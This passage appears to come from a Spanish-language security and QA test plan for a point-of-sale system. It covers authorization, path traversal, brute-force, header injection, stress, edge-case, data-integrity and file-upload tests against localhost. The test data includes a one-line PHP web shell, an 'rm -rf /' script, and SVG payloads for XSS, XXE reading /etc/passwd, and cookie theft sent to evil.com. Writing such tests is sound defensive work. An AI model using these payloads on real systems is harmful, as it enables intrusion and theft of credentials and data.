TOKEN_CAJERO=$(curl -s -X POST http://localhost:8000/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "cajero1", "password": "<PASSWORD>"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Intentar TODOS los endpoints restringidos con token de cajero:
# Productos - crear/editar/borrar
curl -X POST http://localhost:8000/api/v1/products/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_CAJERO" \
  -d '{"sku": "HACK", "name": "Hack", "price": 1}'

# Ventas - cancelar
curl -X POST http://localhost:8000/api/v1/sales/1/cancel \
  -H "Authorization: Bearer $TOKEN_CAJERO"

# Inventario - ajustar
curl -X POST http://localhost:8000/api/v1/inventory/adjust \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_CAJERO" \
  -d '{"product_id": 1, "quantity": 100, "reason": "hack"}'

# Mermas - aprobar
curl -X POST http://localhost:8000/api/v1/mermas/approve \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_CAJERO" \
  -d '{"merma_id": 1, "approved": true}'

# Gastos - crear
curl -X POST http://localhost:8000/api/v1/expenses/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_CAJERO" \
  -d '{"amount": 999, "description": "hack"}'

# Empleados - CRUD
curl -X POST http://localhost:8000/api/v1/employees/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN_CAJERO" \
  -d '{"employee_code": "HACK", "name": "Hacker", "position": "admin"}'

# Dashboard restringidos
curl http://localhost:8000/api/v1/dashboard/wealth \
  -H "Authorization: Bearer $TOKEN_CAJERO"
curl http://localhost:8000/api/v1/dashboard/executive \
  -H "Authorization: Bearer $TOKEN_CAJERO"

# TODOS deben retornar 403 Forbidden
```

### 17.6 Path Traversal

```bash
# Intentar acceder a archivos del sistema via parametros de ruta
curl http://localhost:8000/api/v1/products/../../etc/passwd \
  -H "Authorization: Bearer $TOKEN"

curl http://localhost:8000/api/v1/sat/..%2F..%2F..%2Fetc%2Fpasswd

curl "http://localhost:8000/api/v1/products/scan/..%2F..%2F..%2Fapp%2Fconfig.py" \
  -H "Authorization: Bearer $TOKEN"

# Si hay endpoints de descarga de archivos/fotos:
curl "http://localhost:8000/api/v1/mermas/photo/../../../../etc/shadow" \
  -H "Authorization: Bearer $TOKEN"
```

### 17.7 Rate Limiting y Fuerza Bruta

```bash
# Login: 200 intentos en 60 segundos
for i in $(seq 1 200); do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:8000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "wrong"}')
  echo "Intento $i: HTTP $CODE"
  if [ "$CODE" = "429" ]; then
    echo "Rate limit activado en intento $i"
    break
  fi
done

# API general: 500 requests en 60 segundos al mismo endpoint
for i in $(seq 1 500); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    http://localhost:8000/api/v1/products/?limit=1 \
    -H "Authorization: Bearer $TOKEN" &
done
wait

# Endpoint sin auth (SAT): posible vector de DDoS
for i in $(seq 1 1000); do
  curl -s -o /dev/null "http://localhost:8000/api/v1/sat/search?q=test" &
done
wait
```

### 17.8 Header Injection

```bash
# CRLF injection en headers
curl http://localhost:8000/api/v1/products/ \
  -H "Authorization: Bearer $TOKEN" \
  -H $'X-Custom: value\r\nInjected-Header: malicious'

# Host header poisoning
curl http://localhost:8000/api/v1/auth/login \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "test"}'

# X-Forwarded-For spoofing (para bypass de rate limiting basado en IP)
for i in $(seq 1 100); do
  curl -s -X POST http://localhost:8000/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d '{"username": "admin", "password": "wrong"}'
done
# Si el rate limiting se basa en X-Forwarded-For, esto lo bypasea
```

---

## 18. Pruebas de Estres y Rendimiento

### 18.1 Volumen de Productos

```bash
# Crear 1000 productos
for i in $(seq 1 1000); do
  curl -s -X POST http://localhost:8000/api/v1/products/ \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"sku\": \"STRESS-$i\", \"name\": \"Producto Stress Test $i\", \"price\": $((RANDOM % 1000 + 1)).99, \"stock\": $((RANDOM % 100)), \"category\": \"Stress Test\"}" &
  # Ejecutar en lotes de 20 para no saturar
  if [ $((i % 20)) -eq 0 ]; then wait; echo "Creados: $i"; fi
done
wait

# Ahora probar busqueda con 1000+ productos
time curl -s "http://localhost:8000/api/v1/products/?search=Stress&limit=50" \
  -H "Authorization: Bearer $TOKEN" | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'Encontrados: {len(d[\"data\"])}')"
# Tiempo aceptable: < 500ms
```

### 18.2 Volumen de Ventas

```bash
# Crear 500 ventas rapidas (necesita turno abierto y productos con stock)
for i in $(seq 1 500); do
  curl -s -X POST http://localhost:8000/api/v1/sales/ \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"items": [{"product_id": 1, "qty": 1, "price": 10, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 20, "branch_id": 1, "serie": "A"}' &
  if [ $((i % 10)) -eq 0 ]; then wait; echo "Ventas: $i"; fi
done
wait

# Verificar integridad
echo "Verificar: stock debe haber bajado en exactamente 500 unidades"
echo "Verificar: folio secuencial sin huecos"
echo "Verificar: resumen de turno coincide con total de ventas"
```

### 18.3 Usuarios Concurrentes

```bash
# Simular 10 cajeros haciendo ventas simultaneas
# Cada "cajero" hace 10 ventas
for cajero in $(seq 1 10); do
  for venta in $(seq 1 10); do
    curl -s -X POST http://localhost:8000/api/v1/sales/ \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer $TOKEN" \
      -d "{\"items\": [{\"product_id\": $cajero, \"qty\": 1, \"price\": 10, \"price_includes_tax\": true}], \"payment_method\": \"cash\", \"cash_received\": 20, \"branch_id\": 1, \"serie\": \"A\"}" &
  done
done
wait
echo "100 ventas concurrentes completadas - verificar consistencia"
```

### 18.4 Carrito Grande

```bash
# Venta con 50 items diferentes
ITEMS=""
for i in $(seq 1 50); do
  if [ -n "$ITEMS" ]; then ITEMS="$ITEMS,"; fi
  ITEMS="$ITEMS{\"product_id\": $i, \"qty\": 1, \"price\": 10, \"price_includes_tax\": true}"
done

curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"items\": [$ITEMS], \"payment_method\": \"cash\", \"cash_received\": 10000, \"branch_id\": 1, \"serie\": \"A\"}"
# Debe completarse sin timeout, stock de 50 productos debe actualizarse atomicamente
```

### 18.5 Base de Datos con Alto Volumen

**Verificar con datos de produccion simulados:**

- [ ] Con 100,000+ productos: la busqueda responde en < 1 segundo
- [ ] Con 50,000+ ventas: el historial con paginacion funciona correctamente
- [ ] Con 10,000+ clientes: la busqueda por nombre/telefono es fluida
- [ ] Con 500,000+ movimientos de inventario: el listado con filtros funciona
- [ ] Los reportes diarios con 1 ano de datos se generan en < 5 segundos
- [ ] El ranking de productos con millones de ventas no causa timeout

### 18.6 Memory Leaks

**Pruebas manuales en frontend:**

1. Abrir la aplicacion Electron
2. Abrir el Monitor de Tareas (Task Manager) de Electron o del sistema
3. Anotar el uso de memoria inicial
4. Navegar entre TODOS los modulos (F1 a F11) 50 veces seguidas
5. Buscar productos, abrir/cerrar modales, completar ventas repetidamente
6. Despues de 30 minutos de uso continuo, verificar la memoria
7. **Aceptable:** Aumento de < 100MB
8. **Problema:** Aumento constante que no se detiene (memory leak)

### 18.7 Ajustes Masivos de Inventario

```bash
# 100 ajustes al mismo producto en paralelo
for i in $(seq 1 100); do
  curl -s -X POST http://localhost:8000/api/v1/inventory/adjust \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"product_id": 1, "quantity": 1, "reason": "Stress test"}' &
done
wait

# Verificar: stock debe ser exactamente original + 100
# No debe haber lost updates por condiciones de carrera
```

---

## 19. Pruebas de Casos Extremos (Edge Cases)

### 19.1 Precios Extremos

- [ ] Producto con precio $0.00 - se puede vender? el ticket muestra $0?
- [ ] Producto con precio $0.001 - como se redondea?
- [ ] Producto con precio $99,999,999.99 - se desborda el campo en el ticket?
- [ ] Descuento de $0.01 en producto de $0.01 - total es $0.00?
- [ ] Descuento del 100% - total es $0?
- [ ] Precio con 10 decimales ($10.1234567890) - se trunca o redondea?
- [ ] Precio que al multiplicar por cantidad causa desbordamiento numerico

### 19.2 Nombres y Textos Extremos

- [ ] Producto con nombre de 300+ caracteres - se muestra completo en ticket? se trunca?
- [ ] Producto con nombre de 1 caracter ("A")
- [ ] Producto con nombre vacio ("")
- [ ] Producto con nombre que es solo espacios ("     ")
- [ ] Producto con nombre con saltos de linea ("Linea1\nLinea2")
- [ ] Producto con nombre con tabs ("Col1\tCol2")
- [ ] Producto con nombre con caracteres NULL ("Nombre\0Oculto")
- [ ] Cliente con nombre en arabe, japones, chino, ruso, hebreo
- [ ] Cliente con nombre con caracteres de control (ASCII 0-31)
- [ ] Campo de notas con texto de 50,000 caracteres

### 19.3 Cantidades y Stock

- [ ] Venta con cantidad 0.01 (para productos a granel)
- [ ] Venta con cantidad 0.001 (tres decimales)
- [ ] Stock actual es 0.01, intentar vender 0.01 - debe funcionar
- [ ] Stock actual es 0.01, intentar vender 0.02 - debe fallar
- [ ] Ajuste de inventario que deja stock en exactamente 0.00
- [ ] Producto con stock de 999,999,999 unidades - UI se desborda?

### 19.4 Credito - Limites Exactos

- [ ] Cliente con credit_limit=1000, credit_balance=999.99, intentar venta de $0.02 - debe funcionar
- [ ] Cliente con credit_limit=1000, credit_balance=1000.00, intentar venta de $0.01 - debe fallar
- [ ] Cliente con credit_limit=0 - no puede comprar a credito
- [ ] Cancelar venta a credito cuando el limite fue reducido despues de la venta
- [ ] Credito con saldo exacto al limite, cancelar venta, available_credit debe ser > 0

### 19.5 Fechas y Tiempo

- [ ] Venta creada a las 23:59:59 del 31 de diciembre - aparece en reporte del dia correcto?
- [ ] Turno que cruza la medianoche - las ventas se asignan al dia correcto?
- [ ] Reporte del 29 de febrero en ano bisiesto (2028)
- [ ] Reporte del 29 de febrero en ano no bisiesto (2026) - debe dar error o manejar gracefully
- [ ] Cambio de horario DST (si aplica en la zona del servidor)
- [ ] Diferencia de timezone entre servidor y cliente Electron
- [ ] Fecha del sistema del cliente adelantada 1 ano - que pasa con tokens y reportes?

### 19.6 Navegacion del Usuario

- [ ] Presionar F5 (refresh) durante una venta en proceso - se pierde el carrito?
- [ ] Presionar boton "Atras" del navegador despues de completar venta - no debe recrear la venta
- [ ] Cerrar la ventana Electron durante procesamiento de venta - la venta queda en estado inconsistente?
- [ ] Abrir dos instancias de la app Electron - ambas pueden operar?
- [ ] Cambiar de modulo (F1 a F3 y de regreso) - se mantiene el carrito en F1?
- [ ] Modal de confirmacion: presionar Enter rapidamente en el teclado - no debe ejecutar accion doble

### 19.7 Unicode y Caracteres Especiales

Probar en todos los campos de texto:

```
Emojis simples: 🔥 💰 🎉 ✅ ❌ 📱 🛒
Emojis compuestos: 👨‍👩‍👧‍👦 🏳️‍🌈 👍🏽
Caracteres especiales: ñ Ñ á é í ó ú ü Ü ¡ ¿ € £ ¥ © ® ™
Simbolos matematicos: ∞ ≠ ≤ ≥ ± × ÷ √ ∑ ∏
Caracteres RTL (derecha a izquierda): مرحبا שלום
Caracteres CJK: 你好世界 こんにちは 안녕하세요
Zalgo text: Z̸̧̛̺̲̣̻̳̼̪̖͈̫̞̼̦̲̳͓̬̫̣̼̺̱̫̤̲̘̗̲̩̭̬̞̫̝̿̽̈́̌̓̈́̃̑̒̂̈́̈́ͅa̸̧l̸̨g̸o̸
Caracteres de control: \x00 \x01 \x1B \x7F
Zero-width characters: ​ (zero-width space), ‌ (zero-width non-joiner)
```

### 19.8 Copiar-Pegar Masivo

- [ ] Copiar-pegar 1MB de texto en campo de busqueda de productos
- [ ] Copiar-pegar contenido HTML/RTF en campo de nombre de cliente
- [ ] Copiar numero con formato "$1,234.56" en campo de precio
- [ ] Copiar SKU con espacios al inicio/final " SKU001 " - se trima automaticamente?

### 19.9 Folio y Secuencias

- [ ] Despues de cancelar venta con folio A1-000042, la siguiente es A1-000043 (no reutiliza)
- [ ] Folio no tiene huecos despues de errores de venta (intentos fallidos no consumen folio)
- [ ] Folio despues de 999,999 - se comporta correctamente?
- [ ] Multiples ventas simultaneas generan folios unicos (sin duplicados)

---

## 20. Pruebas de Compatibilidad y UI

### 20.1 Resoluciones de Pantalla

Probar la aplicacion completa en cada resolucion:

| Resolucion | Caso de uso |
|---|---|
| 1024x768 | Monitor viejo / proyector |
| 1280x720 | Laptop basica HD |
| 1366x768 | Laptop mas comun en Mexico |
| 1440x900 | Monitor estandar |
| 1920x1080 | Full HD (objetivo principal) |
| 2560x1440 | Monitor 2K |
| 3840x2160 | Monitor 4K |

**Para cada resolucion verificar:**
- [ ] Todos los botones son visibles y clickeables
- [ ] Las tablas no se salen de la pantalla
- [ ] Los modales se centran correctamente
- [ ] El teclado numerico de la terminal (F1) es usable
- [ ] Los campos de texto no se superponen con labels
- [ ] La barra lateral no tapa contenido importante

### 20.2 Niveles de Zoom

Probar con el zoom del navegador/Electron:

- [ ] 75% - todo es legible, nada se rompe
- [ ] 100% - estado base, referencia
- [ ] 125% - comun en laptops con pantalla HiDPI
- [ ] 150% - uso con monitor grande a distancia
- [ ] 200% - maximo usable, para personas con dificultad visual

**Para cada nivel verificar:**
- [ ] Botones no se superponen
- [ ] Textos no se truncan de forma que pierdan significado
- [ ] No aparecen scrollbars horizontales innecesarias
- [ ] Los modales caben en la pantalla
- [ ] Los montos y totales son completamente visibles

### 20.3 Navegacion con Teclado (Sin Mouse)

- [ ] Se puede hacer login usando solo Tab y Enter
- [ ] Se puede navegar entre modulos con F1-F11
- [ ] Se puede completar una venta usando solo el teclado
- [ ] Tab navega por los campos en orden logico
- [ ] Shift+Tab navega hacia atras
- [ ] Escape cierra modales
- [ ] Enter confirma acciones (como "Completar Venta")
- [ ] Focus visible (outline) aparece en el elemento activo
- [ ] No hay "trampas de focus" (loops de Tab que no permiten salir)
- [ ] Dropdown y select se pueden operar con flechas arriba/abajo

### 20.4 Accesibilidad

- [ ] Todos los campos de formulario tienen labels (para lectores de pantalla)
- [ ] Las imagenes tienen alt text descriptivo
- [ ] Los colores tienen suficiente contraste (WCAG AA minimo)
- [ ] Los errores se comunican no solo con color (tambien texto/icono)
- [ ] Los botones tienen texto descriptivo (no solo iconos)
- [ ] El tamano de fuente minimo es 14px
- [ ] Los elementos interactivos tienen area minima de 44x44px

### 20.5 Escalado de Fuentes del Sistema

- [ ] Con fuentes del sistema al 100% - referencia
- [ ] Con fuentes del sistema al 125% - la UI se adapta?
- [ ] Con fuentes del sistema al 150% - no se rompe el layout?

### 20.6 Modo Oscuro / Alto Contraste

- [ ] Si el sistema operativo esta en modo oscuro - la app se adapta o mantiene su tema?
- [ ] En modo de alto contraste de Windows - los elementos son distinguibles?
- [ ] Los campos deshabilitados se distinguen de los habilitados

---

## 21. Pruebas de Integridad de Datos

### 21.1 Atomicidad de Transacciones

**Matar backend durante una venta:**

```bash
# Terminal 1: Iniciar una venta lenta (muchos items)
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": 100, "price_includes_tax": true}, {"product_id": 2, "qty": 1, "price": 200, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 500, "branch_id": 1, "serie": "A"}'

# Terminal 2: Mientras la venta se procesa, matar el backend
# kill -9 $(pgrep uvicorn)

# Reiniciar y verificar:
# - La venta se creo completa O no se creo en absoluto (atomicidad)
# - No quedo una venta con algunos items pero no todos
# - El stock NO quedo parcialmente descontado
```

### 21.2 Desconectar Base de Datos

```bash
# Pausar PostgreSQL mientras hay operaciones en curso
docker compose pause postgres

# Intentar crear una venta
curl -X POST http://localhost:8000/api/v1/sales/ \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"items": [{"product_id": 1, "qty": 1, "price": 100, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 200, "branch_id": 1, "serie": "A"}'
# Debe retornar error 500/503, no debe quedarse colgado indefinidamente

# Reanudar PostgreSQL
docker compose unpause postgres

# Verificar que la BD esta consistente (no hay transacciones huerfanas)
```

### 21.3 Atomicidad de Stock en Ventas Concurrentes

```bash
# Preparar: producto con stock=100
# Lanzar 200 ventas de qty=1 en paralelo
# Resultado esperado: exactamente 100 ventas exitosas, 100 rechazadas por stock insuficiente
# Stock final: exactamente 0

STOCK_INICIAL=100
for i in $(seq 1 200); do
  curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:8000/api/v1/sales/ \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"items": [{"product_id": 1, "qty": 1, "price": 10, "price_includes_tax": true}], "payment_method": "cash", "cash_received": 20, "branch_id": 1, "serie": "A"}' &
done
wait

# Contar cuantas fueron 200 OK vs 400/409
# Stock final DEBE ser exactamente 0 (no negativo)
```

### 21.4 Cross-Check de Reportes

Despues de un dia de testing, verificar manualmente:

- [ ] `SUM(total)` de todas las ventas completadas en la BD = total del reporte diario
- [ ] `SUM(total)` de ventas en efectivo del turno = ventas_efectivo en resumen de turno
- [ ] Numero de ventas canceladas en reporte = `COUNT(*)` de ventas con status='cancelled'
- [ ] `SUM(credit_history.amount)` para un cliente = `credit_balance` del cliente
- [ ] Stock actual del producto = stock_inicial + SUM(ajustes_positivos) - SUM(ajustes_negativos) - SUM(ventas) + SUM(cancelaciones)

```sql
-- Verificacion directa en PostgreSQL:

-- Total de ventas del dia debe coincidir con reporte
SELECT SUM(total) as total_ventas, COUNT(*) as num_ventas
FROM sales
WHERE status = 'completed'
AND DATE(timestamp) = CURRENT_DATE;

-- Stock del producto debe coincidir con movimientos
SELECT p.id, p.name, p.stock as stock_actual,
  (SELECT COALESCE(SUM(CASE WHEN movement_type='IN' THEN quantity ELSE -quantity END), 0)
   FROM inventory_movements WHERE product_id = p.id) as stock_calculado
FROM products p
WHERE p.stock != (
  SELECT COALESCE(SUM(CASE WHEN movement_type='IN' THEN quantity ELSE -quantity END), 0)
  FROM inventory_movements WHERE product_id = p.id
);
-- Esta query debe retornar 0 filas (no hay discrepancias)
```

### 21.5 Secuencia de Folios

```sql
-- Verificar que no hay huecos en los folios
SELECT folio_number, folio_visible
FROM sales
WHERE serie = 'A'
ORDER BY folio_number;

-- Verificar que no hay folios duplicados
SELECT folio_visible, COUNT(*)
FROM sales
GROUP BY folio_visible
HAVING COUNT(*) > 1;
-- Debe retornar 0 filas
```

### 21.6 Consistencia de Credito

```sql
-- Para cada cliente, verificar que credit_balance coincide con la suma de movimientos
SELECT c.id, c.name, c.credit_balance,
  COALESCE(SUM(CASE
    WHEN ch.type = 'CHARGE' THEN ch.amount
    WHEN ch.type = 'PAYMENT' THEN -ch.amount
    WHEN ch.type = 'REVERSAL' THEN -ch.amount
    ELSE 0
  END), 0) as balance_calculado
FROM customers c
LEFT JOIN credit_history ch ON c.id = ch.customer_id
GROUP BY c.id, c.name, c.credit_balance
HAVING c.credit_balance != COALESCE(SUM(CASE
    WHEN ch.type = 'CHARGE' THEN ch.amount
    WHEN ch.type = 'PAYMENT' THEN -ch.amount
    WHEN ch.type = 'REVERSAL' THEN -ch.amount
    ELSE 0
  END), 0);
-- Debe retornar 0 filas (no hay discrepancias)
```

### 21.7 Movimientos de Inventario Suman al Stock

```sql
-- Para cada producto, el stock debe ser la suma neta de movimientos
SELECT p.id, p.sku, p.stock,
  COALESCE(SUM(
    CASE
      WHEN im.movement_type IN ('IN', 'adjustment_in', 'cancellation') THEN im.quantity
      WHEN im.movement_type IN ('OUT', 'adjustment_out', 'sale') THEN -im.quantity
      ELSE 0
    END
  ), 0) as stock_from_movements
FROM products p
LEFT JOIN inventory_movements im ON p.id = im.product_id
GROUP BY p.id, p.sku, p.stock
HAVING ABS(p.stock - COALESCE(SUM(
    CASE
      WHEN im.movement_type IN ('IN', 'adjustment_in', 'cancellation') THEN im.quantity
      WHEN im.movement_type IN ('OUT', 'adjustment_out', 'sale') THEN -im.quantity
      ELSE 0
    END
  ), 0)) > 0.01;
-- Debe retornar 0 filas
```

---

## 22. Pruebas de Recuperacion

### 22.1 Backend se Reinicia con Usuarios Activos

**Escenario:**

1. Tener una sesion activa en el frontend
2. Matar y reiniciar el backend (`kill` + `uvicorn`)
3. **Verificar:**
   - [ ] El frontend detecta que perdio conexion (muestra error amigable)
   - [ ] Al reconectarse, el token sigue siendo valido (JWT es stateless)
   - [ ] No se pierde el carrito de venta en progreso (si esta en memoria local)
   - [ ] Las peticiones pendientes se reintentan o muestran error claro
   - [ ] No hay ventas fantasma (creadas a medias)

### 22.2 Base de Datos Temporalmente No Disponible

**Escenario:**

```bash
# 1. Pausar PostgreSQL por 30 segundos
docker compose pause postgres
sleep 30
docker compose unpause postgres

# 2. Durante la pausa, verificar:
```

- [ ] El backend retorna errores 503 (Service Unavailable), no se cuelga
- [ ] El frontend muestra "Sin conexion al servidor" o similar
- [ ] No hay timeout infinito (las peticiones fallan en < 30 segundos)
- [ ] Al restaurar la BD, el sistema se recupera automaticamente
- [ ] No se requiere reiniciar el backend manualmente
- [ ] Las transacciones que estaban en curso fueron revertidas correctamente

### 22.3 Cache/Redis No Disponible (si aplica)

- [ ] Si Redis se cae, el sistema sigue funcionando (degradado pero funcional)
- [ ] Las sesiones no se invalidan si Redis se reinicia
- [ ] Los datos no se corrompen por falta de cache

### 22.4 Refresh de Frontend Durante Venta

**Escenario:**

1. Agregar 5 productos al carrito en la terminal (F1)
2. Presionar F5 (refresh) o Ctrl+R
3. **Verificar:**
   - [ ] El carrito se vacio? Se persiste en localStorage?
   - [ ] Si se perdio, el stock NO se desconto (la venta no se proceso)
   - [ ] Se puede iniciar una nueva venta sin problemas
   - [ ] No hay datos corruptos en el estado de la app

### 22.5 Falla de Energia (Simulacion)

**Escenario para servidor:**

1. Ejecutar varias ventas simultaneas
2. Forzar apagado del contenedor: `docker compose kill`
3. Reiniciar: `docker compose up -d`
4. **Verificar:**
   - [ ] PostgreSQL se recupera con WAL (Write-Ahead Log)
   - [ ] No hay transacciones parciales en la BD
   - [ ] El stock es consistente
   - [ ] Los folios son secuenciales
   - [ ] El turno que estaba abierto sigue abierto (o se puede re-abrir)

**Escenario para cliente:**

1. Tener una venta en proceso de completarse
2. Forzar cierre de Electron (kill -9)
3. Reabrir la app
4. **Verificar:**
   - [ ] Si la venta se completo en el backend, se refleja al recargar
   - [ ] Si la venta no se completo, no hay datos residuales
   - [ ] El usuario puede continuar operando normalmente

### 22.6 Saturacion de Disco

- [ ] Si el disco esta lleno, las ventas retornan error claro (no se cuelgan)
- [ ] Los logs no consumen todo el disco (rotacion de logs configurada)
- [ ] Si PostgreSQL se queda sin espacio, se detecta en `/health`

### 22.7 Conexion de Red Intermitente

**Simular con Electron DevTools (Network tab):**

1. Poner la red en "Slow 3G" en DevTools
2. Completar una venta
3. **Verificar:**
   - [ ] La venta se completa (aunque lento), no timeout prematuro
   - [ ] El usuario ve feedback de "Procesando..." durante la espera
   - [ ] No se envian multiples requests por impaciencia del usuario (boton deshabilitado)

4. Desconectar la red completamente
5. Intentar completar venta
6. **Verificar:**
   - [ ] Error claro "Sin conexion al servidor"
   - [ ] Al reconectar, la app funciona sin reiniciar

---

## 23. Pruebas de Archivos y Uploads

Esta seccion cubre escenarios donde el usuario intenta subir archivos no esperados, corruptos, maliciosos o con caracteristicas inusuales. Aplica a cualquier endpoint o campo que acepte archivos (fotos de merma, imagenes de productos, importaciones CSV, etc.).

### 23.1 Archivos con Extension Incorrecta

Intentar subir cada uno de estos archivos donde el sistema espera imagenes (JPG/PNG):

| Archivo | Extension | Tipo Real | Resultado Esperado |
|---|---|---|---|
| documento.pdf | .pdf | application/pdf | Rechazado con error claro |
| cancion.mp3 | .mp3 | audio/mpeg | Rechazado con error claro |
| video.mp4 | .mp4 | video/mp4 | Rechazado con error claro |
| hoja_calculo.xlsx | .xlsx | application/vnd.openxmlformats | Rechazado con error claro |
| hoja_calculo.csv | .csv | text/csv | Rechazado con error claro |
| presentacion.pptx | .pptx | application/vnd.openxmlformats | Rechazado con error claro |
| documento.docx | .docx | application/vnd.openxmlformats | Rechazado con error claro |
| archivo.zip | .zip | application/zip | Rechazado con error claro |
| archivo.rar | .rar | application/x-rar-compressed | Rechazado con error claro |
| archivo.7z | .7z | application/x-7z-compressed | Rechazado con error claro |
| archivo.tar.gz | .tar.gz | application/gzip | Rechazado con error claro |
| ejecutable.exe | .exe | application/x-executable | Rechazado con error claro |
| ejecutable.msi | .msi | application/x-msi | Rechazado con error claro |
| script.sh | .sh | text/x-shellscript | Rechazado con error claro |
| script.bat | .bat | text/x-batch | Rechazado con error claro |
| script.py | .py | text/x-python | Rechazado con error claro |
| pagina.html | .html | text/html | Rechazado con error claro |
| pagina.php | .php | text/x-php | Rechazado con error claro |
| fuente.ttf | .ttf | font/ttf | Rechazado con error claro |
| database.db | .db | application/x-sqlite3 | Rechazado con error claro |
| database.sql | .sql | text/plain | Rechazado con error claro |
| iso_disk.iso | .iso | application/x-iso9660-image | Rechazado con error claro |
| torrent.torrent | .torrent | application/x-bittorrent | Rechazado con error claro |

**Verificar para CADA archivo:**
- [ ] El sistema rechaza el archivo ANTES de procesarlo
- [ ] El mensaje de error es claro: "Solo se permiten imagenes JPG, PNG o WEBP"
- [ ] NO se guarda nada en disco/servidor
- [ ] NO se cuelga la aplicacion
- [ ] La UI vuelve a su estado normal despues del error
- [ ] No aparece un error 500 del servidor (debe ser 400/422)

### 23.2 Archivos con Extension Renombrada (Spoofing)

Estos son los mas peligrosos — el archivo tiene extension de imagen pero contenido diferente:

```bash
# Crear archivos de prueba renombrados:
cp documento.pdf foto_falsa.jpg
cp malware.exe imagen.png
cp script.php avatar.jpg
cp hoja.xlsx datos.png
cp video.mp4 preview.webp
cp database.sql export.jpg
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
echo '<script>alert("xss")</script>' > xss.png
echo '#!/bin/bash\nrm -rf /' > danger.webp
```

**Para cada archivo renombrado, verificar:**
- [ ] El backend valida magic bytes/firma del archivo, no solo la extension
- [ ] El archivo es rechazado con error "Archivo invalido" o similar
- [ ] El frontend tambien valida el tipo MIME antes de enviar (doble validacion)
- [ ] Los archivos .php renombrados a .jpg NO pueden ejecutarse en el servidor

### 23.3 Archivos SVG Maliciosos

Los SVG son especialmente peligrosos porque pueden contener JavaScript:

```xml
<!-- svg_xss.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>

<!-- svg_redirect.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)">
    <rect width="100" height="100"/>
  </a>
</svg>

<!-- svg_exfiltrate.svg -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://evil.com/steal?cookie=" onload="this.href='http://evil.com/steal?c='+document.cookie"/>
</svg>

<!-- svg_external_entity.svg -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**Verificar:**
- [ ] Si el sistema acepta SVG: los scripts dentro del SVG NO se ejecutan al renderizar
- [ ] Si el sistema NO acepta SVG: el archivo es rechazado limpiamente
- [ ] Las entidades externas XML (XXE) no se resuelven
- [ ] Los SVG se sirven con Content-Type: image/svg+xml y Content-Disposition: inline (no como text/html)

### 23.4 Archivos de Tamano Extremo

| Escenario | Tamano | Resultado Esperado |
|---|---|---|
| Archivo vacio (0 bytes) | 0 B | Rechazado: "Archivo vacio" |
| 1 pixel transparente | ~100 B | Aceptado (tecnicante es imagen valida) |
| Archivo de 1 byte | 1 B | Rechazado: no es imagen valida |
| Imagen normal | 500 KB | Aceptado |
| Imagen grande | 5 MB | Aceptado o rechazado segun limite |
| Imagen muy grande | 20 MB | Rechazado: "Archivo demasiado grande" |
| Imagen enorme | 100 MB | Rechazado SIN causar crash del servidor |
| Imagen gigante | 1 GB | El servidor NO debe intentar cargarla en memoria |
| Zip bomb (42.zip) | 42 KB → 4.5 PB descomprimido | Si se descomprime, debe fallar |

```bash
# Crear archivos de prueba:
# Archivo vacio
touch vacio.jpg

# Archivo de 1 byte
echo -n "x" > un_byte.jpg

# Archivo de 100MB con datos random
dd if=/dev/urandom of=enorme.jpg bs=1M count=100

# Archivo de 1GB
dd if=/dev/urandom of=gigante.jpg bs=1M count=1024

# Imagen valida pero gigante en dimensiones (50000x50000 pixeles)
# Puede causar out-of-memory al decodificar
python3 -c "
from PIL import Image
img = Image.new('RGB', (50000, 50000), color='red')
img.save('mega_dimension.png')
"
```

**Verificar:**
- [ ] El limite de tamano se valida ANTES de leer todo el archivo en memoria
- [ ] El servidor no se cuelga ni consume toda la RAM
- [ ] El progreso de upload se muestra correctamente en el frontend
- [ ] Si se rechaza, el archivo parcialmente subido se limpia del disco
- [ ] El mensaje de error incluye el limite permitido ("Maximo 5 MB")

### 23.5 Imagenes Corruptas

```bash
# Imagen con header valido pero datos corruptos
cp imagen_real.jpg corrupta.jpg
dd if=/dev/urandom of=corrupta.jpg bs=1 count=500 seek=100 conv=notrunc

# JPEG con header correcto pero body truncado
head -c 1024 imagen_real.jpg > truncada.jpg

# PNG con firma valida pero chunks rotos
